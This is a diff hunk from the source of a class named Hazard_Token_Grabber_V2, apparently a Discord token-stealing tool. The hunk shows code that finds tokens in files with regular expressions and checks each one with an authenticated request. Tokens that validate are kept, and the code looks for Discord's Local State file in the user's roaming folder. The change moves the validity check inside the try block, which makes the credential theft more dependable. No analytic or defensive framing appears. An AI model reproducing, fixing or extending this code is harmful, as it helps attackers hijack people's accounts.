@@ -281,10 +281,10 @@ class Hazard_Token_Grabber_V2:
                             for token in findall(regex, line):
                                 try:
                                     r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                    if r.status_code == 200 and token not in self.tokens:
+                                        self.tokens.append(token)
                                 except Exception:
                                     pass
-                                if r.status_code == 200 and token not in self.tokens:
-                                    self.tokens.append(token)
             else:
                 if os.path.exists(self.roaming+'\\discord\\Local State'):
                     for file_name in os.listdir(path):
